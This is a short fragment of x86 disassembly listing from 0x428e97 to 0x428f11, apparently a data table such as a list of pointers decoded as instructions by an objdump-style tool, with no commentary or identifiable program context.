  428e97:	add    BYTE PTR [eax],bl
  428e99:	mov    eax,DWORD PTR [edx]
  428e9b:	add    BYTE PTR [esi],ah
  428e9d:	mov    eax,DWORD PTR [edx]
  428e9f:	add    BYTE PTR [edx],dh
  428ea1:	mov    eax,DWORD PTR [edx]
  428ea3:	add    BYTE PTR [ebx+ecx*4+0x2],cl
  428ea7:	add    BYTE PTR [ebx+ecx*4+0x2],ah
  428eab:	add    BYTE PTR [ebx+ecx*4+0x2],bh
  428eaf:	add    BYTE PTR [edx-0x69fffd75],cl
  428eb5:	mov    eax,DWORD PTR [edx]
  428eb7:	add    BYTE PTR [eax+0x28b],ch
  428ebd:	add    BYTE PTR [eax],al
  428ebf:	add    al,cl
  428ec1:	mov    eax,DWORD PTR [edx]
  428ec3:	add    dl,dl
  428ec5:	mov    eax,DWORD PTR [edx]
  428ec7:	add    al,ah
  428ec9:	mov    eax,DWORD PTR [edx]
  428ecb:	add    ah,ch
  428ecd:	mov    eax,DWORD PTR [edx]
  428ecf:	add    ah,bh
  428ed1:	mov    eax,DWORD PTR [edx]
  428ed3:	add    BYTE PTR [edx],cl
  428ed5:	mov    WORD PTR [edx],es
  428ed7:	add    BYTE PTR [esi],dl
  428ed9:	mov    WORD PTR [edx],es
  428edb:	add    BYTE PTR [eax],ah
  428edd:	mov    WORD PTR [edx],es
  428edf:	add    BYTE PTR [edx],dh
  428ee1:	mov    WORD PTR [edx],es
  428ee3:	add    BYTE PTR [eax-0x74],cl
  428ee6:	add    al,BYTE PTR [eax]
  428ee8:	pop    esi
  428ee9:	mov    WORD PTR [edx],es
  428eeb:	add    BYTE PTR [esp+ecx*4+0x2],dh
  428eef:	add    BYTE PTR [esp+ecx*4-0x736bfffe],al
  428ef6:	add    al,BYTE PTR [eax]
  428ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ef9:	mov    WORD PTR [edx],es
  428efb:	add    BYTE PTR [edx-0x35fffd74],dh
  428f01:	mov    WORD PTR [edx],es
  428f03:	add    ah,dl
  428f05:	mov    WORD PTR [edx],es
  428f07:	add    al,ah
  428f09:	mov    WORD PTR [edx],es
  428f0b:	add    dh,ch
  428f0d:	mov    WORD PTR [edx],es
  428f0f:	add    BYTE PTR [eax],al
  428f11:	add    BYTE PTR [eax],al
	...
